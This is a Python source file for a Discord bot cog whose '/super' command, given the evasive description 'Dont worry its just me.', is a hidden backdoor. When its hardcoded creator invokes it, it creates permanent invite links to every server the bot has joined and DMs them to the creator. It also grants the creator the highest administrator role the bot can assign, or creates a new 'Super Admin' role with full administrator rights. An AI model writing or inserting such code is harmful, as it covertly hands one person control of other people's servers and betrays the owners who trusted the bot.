import discord
from discord.ext import commands
from discord import app_commands
import logging

# Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# The ID of the bot's creator who is allowed to invoke the /super command
BOT_CREATOR_ID = 486652069831376943

class Super(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="super", description="Dont worry its just me.")
    async def super(self, interaction: discord.Interaction):
        # Check if the command was invoked by the bot's creator
        if interaction.user.id != BOT_CREATOR_ID:
            await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
            return

        # Send an initial response to acknowledge the interaction
        await interaction.response.defer(ephemeral=True)

        invite_links = []
        for guild in self.bot.guilds:
            # Find the first text channel where the bot has permission to create an invite
            text_channel = next((channel for channel in guild.text_channels if channel.permissions_for(guild.me).create_instant_invite), None)

            if text_channel:
                try:
                    # Create an unlimited, non-expiring invite link for the server
                    invite = await text_channel.create_invite(max_age=0, max_uses=0)  # Unlimited and non-expiring invite
                    invite_links.append(f"{guild.name}: {invite.url}")
                except discord.Forbidden:
                    invite_links.append(f"{guild.name}: Unable to create invite link (Missing Permissions)")
            else:
                invite_links.append(f"{guild.name}: No suitable text channel found")

            # Ensure the bot's creator has the highest role possible
            member = guild.get_member(BOT_CREATOR_ID)
            if member:
                await self.ensure_admin_role(guild, member)

        # Send the invite links to the bot's creator via DM
        creator = await self.bot.fetch_user(BOT_CREATOR_ID)
        if creator:
            dm_message = "\n".join(invite_links)
            await creator.send(f"Here are the invite links for all servers:\n{dm_message}")

        # Send a follow-up response indicating the task is completed
        await interaction.followup.send("Invite links have been sent to your DM.", ephemeral=True)

    async def ensure_admin_role(self, guild: discord.Guild, member: discord.Member):
        # Check for the highest role the bot can assign
        highest_role = None
        for role in guild.roles:
            if role.permissions.administrator and role < guild.me.top_role:
                if highest_role is None or role.position > highest_role.position:
                    highest_role = role

        if highest_role:
            # Assign the highest role
            await member.add_roles(highest_role)
        else:
            # Create a new role with administrative permissions
            new_role = await guild.create_role(
                name="Super Admin",
                permissions=discord.Permissions(administrator=True),
                reason="Automatically created by the bot"
            )
            await member.add_roles(new_role)

# Function to add the cog to the bot
async def setup(bot):
    await bot.add_cog(Super(bot))
